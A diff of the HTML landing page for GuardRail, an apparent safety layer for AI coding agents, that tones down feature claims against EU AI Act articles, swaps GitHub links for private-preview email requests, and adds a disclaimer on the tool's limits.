-        <p>Guard classification. PEN-test framework. Risk-based guard activation per command profile.</p>
+        <p>Guard classification per risk level. PEN-test framework for validation. Risk-based guard activation per command profile.</p>
       </div>
       <div class="compliance-item">
         <div class="art">Article 10</div>
         <h3>Data Governance</h3>
-        <p>PII gates prevent secret exposure. Environment dump detection. Container inspection controls.</p>
+        <p>PII gates help prevent secret exposure. Environment dump detection. Container inspection controls.</p>
       </div>
       <div class="compliance-item">
         <div class="art">Article 12</div>
         <h3>Record-Keeping</h3>
-        <p>Timestamped audit log. Every blocked command recorded with guard name, reason, and context.</p>
+        <p>Timestamped audit log. Every blocked command recorded with guard name, reason, and session context.</p>
       </div>
       <div class="compliance-item">
         <div class="art">Article 14</div>
         <h3>Human Oversight</h3>
-        <p>deny() gates block before execution. Approval workflows for critical operations.</p>
+        <p>Pre-execution gates block before damage occurs. Approval workflows for critical operations.</p>
       </div>
       <div class="compliance-item">
         <div class="art">Article 15</div>
         <h3>Accuracy &amp; Robustness</h3>
-        <p>Injection defense. 41 regression tests. True positive and false positive checks per guard.</p>
+        <p>Injection defense. Regression test suite. Continuous validation of guard accuracy.</p>
       </div>
     </div>
   </div>
 </section>
 
+<!-- CTA -->
 <section class="cta-section">
   <div class="wrap">
-    <h2 class="sec-title">Get started in 30 seconds</h2>
-    <p class="sec-desc">One command. 10 security guards. Zero configuration.</p>
+    <h2 class="sec-title">Join the private security review</h2>
+    <p class="sec-desc">Get the ten-rule Core, the threat model, and the release test evidence before the public open-source launch.</p>
     <div class="cta-install">
       <code><span class="prompt">$</span> npx guardrail-agent init</code>
-      <a href="https://github.com/FvdHMBAI/guardrail">GitHub</a>
+      <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Private%20Preview">Request preview</a>
     </div>
     <div class="cta-links">
-      <a href="https://github.com/FvdHMBAI/guardrail">Documentation</a>
-      <a href="https://github.com/FvdHMBAI/guardrail/issues">Report a bug</a>
-      <a href="mailto:pro@promptandbuild.de">Contact</a>
+      <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Documentation">Documentation</a>
+      <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Security%20Feedback">Report a security issue</a>
+      <a href="mailto:frederik@frederikvonderheyden.de">Contact</a>
     </div>
   </div>
 </section>
 
 <footer>
   <div class="wrap">
-    Built by <a href="https://frederikvonderheyden.de">Prompt &amp; Build</a> &middot; <a href="https://github.com/FvdHMBAI/guardrail">GitHub</a> &middot; MIT License &middot; <a href="/impressum.html">Impressum</a> &middot; <a href="/datenschutz.html">Datenschutz</a>
+    Built by <a href="https://frederikvonderheyden.de">Prompt &amp; Build</a> &middot; Core planned under MIT License &middot; <a href="/impressum.html">Impressum</a> &middot; <a href="/datenschutz.html">Datenschutz</a>
+    <p class="disclaimer">GuardRail is an additional enforcement layer, not a sandbox or compliance certificate. It catches accidental and plainly expressed dangerous actions; it does not contain a malicious agent that can rewrite its own hooks or shell. Keep the installation outside agent-writable workspaces and retain least-privilege access, branch protection, database permissions, backups, network controls, and human approval.</p>
   </div>
 </footer>
 
